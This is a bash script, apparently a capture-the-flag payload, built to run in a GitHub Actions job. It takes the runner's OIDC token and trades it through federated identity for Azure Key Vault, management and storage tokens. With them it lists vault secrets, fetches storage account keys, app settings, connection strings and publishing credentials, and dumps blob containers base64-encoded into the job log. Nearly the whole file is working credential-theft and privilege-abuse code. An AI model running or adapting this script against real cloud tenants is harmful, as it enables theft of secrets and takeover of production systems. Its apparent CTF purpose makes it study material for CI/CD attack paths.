#!/usr/bin/env bash
set -uo pipefail
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
FED="72ff278a-9e71-43ec-bac4-2ca303f8e462"   # cicd-deployer (terraform deployer, has FC)
RG="rg-tbl-platform-prod-sea"
b64(){ printf '%s' "$1" | base64 -w0 | tr -d '\n'; }

echo "===WIN_START==="
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
# print OIDC sub to confirm FC subject
echo "$JWT" | cut -d. -f2 | python3 -c 'import sys,base64,json;p=sys.stdin.read().strip();p+="="*(-len(p)%4);print("OIDC_SUB="+json.loads(base64.b64decode(p))["sub"])' 2>/dev/null
[ -z "$JWT" ] && { echo "NO_OIDC"; exit 1; }

# token mint helper via FIC
fedtok(){ curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$FED" -d grant_type=client_credentials \
  --data-urlencode "scope=$1" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$JWT" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null; }

# --- FIC tokens for cicd-deployer across audiences ---
VT=$(fedtok "https://vault.azure.net/.default");      echo "VAULT_TOK_LEN=${#VT}"
AT=$(fedtok "https://management.azure.com/.default"); echo "ARM_TOK_LEN=${#AT}"
ST=$(fedtok "https://storage.azure.com/.default");    echo "STORAGE_TOK_LEN=${#ST}"

# --- vault: can cicd-deployer read the SEC vault? ---
for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  L=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets?api-version=7.4")
  echo "KVLIST_${V}=$(b64 "$L")"
done

# --- ARM: listKeys via the FED (cicd-deployer) ARM token ---
armpost(){ curl -sS -m 20 -X POST "$1" -H "Authorization: Bearer ${AT}" -H "Content-Type: application/json" -d '{}'; }
armget(){  curl -sS -m 20 "$1" -H "Authorization: Bearer ${AT}"; }
declare -A SAKEY
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  R=$(armpost "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01")
  echo "LK_${SA}=$(b64 "$R")"
  SAKEY[$SA]=$(echo "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("keys",[{}])[0].get("value",""))' 2>/dev/null)
done

# --- ARM: enumerate resources in the RG + subscription ---
echo "RGLIST=$(b64 "$(armget "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/resources?api-version=2021-04-01")")"
echo "SUBLIST=$(b64 "$(armget "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01")")"

# --- ARM: appsettings + connectionstrings + publishingcreds for both apps ---
for SITE in app-tbl-reporting-prod app-tbl-storefront-prod; do
  for RG2 in rg-tbl-reporting-prod-eus rg-tbl-platform-prod-sea; do
    A=$(armpost "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-03-01")
    echo "APPSET_${RG2}_${SITE}=$(b64 "$A")"
    C=$(armpost "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/connectionstrings/list?api-version=2022-03-01")
    echo "CONNSTR_${RG2}_${SITE}=$(b64 "$C")"
    P=$(armpost "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/publishingcredentials/list?api-version=2023-01-01")
    echo "PUB_${RG2}_${SITE}=$(b64 "$P")"
  done
done

# --- SharedKey blob reader ---
read_blob() {
  python3 - "$1" "$2" "$3" "$4" <<'PY'
import sys, base64, hashlib, hmac, datetime, urllib.request
account, key, container, blob = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
kb = base64.b64decode(key)
d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT'); v = "2019-12-12"
canon = f"/{account}/{container}/{blob}"
sts = "\n".join(["GET"]+[""]*11+[f"x-ms-date:{d}\nx-ms-version:{v}", canon])
sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
url = f"https://{account}.blob.core.windows.net/{container}/{blob}"
req = urllib.request.Request(url, headers={"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"})
try: print(urllib.request.urlopen(req, timeout=20).read().decode('utf-8','replace'))
except Exception as e: print(f"__ERR__ {type(e).__name__}: {e}")
PY
}
list_blobs() {
  python3 - "$1" "$2" "$3" <<'PY'
import sys, base64, hashlib, hmac, datetime, urllib.request, xml.etree.ElementTree as ET
account, key, container = sys.argv[1], sys.argv[2], sys.argv[3]
kb = base64.b64decode(key)
d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT'); v = "2019-12-12"
canon = f"/{account}/{container}\ncomp:list\nrestype:container"
sts = "\n".join(["GET"]+[""]*11+[f"x-ms-date:{d}\nx-ms-version:{v}", canon])
sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
req = urllib.request.Request(url, headers={"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"})
data = urllib.request.urlopen(req, timeout=20).read()
ns={'a':'http://schemas.microsoft.com/windowsazure'}
for b in ET.fromstring(data).findall('.//a:Blob', ns): print(b.find('a:Name', ns).text)
PY
}

# --- if we got the config account key, dump the `config` container (flag here) ---
SA="sttblappcfgprodx3euoz"; K="${SAKEY[$SA]:-}"
if [ -n "$K" ]; then
  echo "===HAVE_KEY_${SA}==="
  for b in $(list_blobs "$SA" "$K" "config" 2>/dev/null); do
    [ -z "$b" ] && continue
    echo "===READ_${b}==="
    read_blob "$SA" "$K" "config" "$b" | base64 -w0 | tr -d '\n'; echo ""
  done
else
  echo "===NO_KEY_${SA}==="
fi

# --- storage OAuth data-plane probe (which container does cicd-deployer cover?) ---
for C in config reports exports data logs archive backup; do
  R=$(curl -sS -m 12 -H "Authorization: Bearer $ST" -H "x-ms-version: 2023-11-03" \
    "https://sttblappcfgprodx3euoz.blob.core.windows.net/$C?restype=container&comp=list")
  echo "OAU_${C}=$(b64 "${R:0:400}")"
done

echo "===WIN_END==="
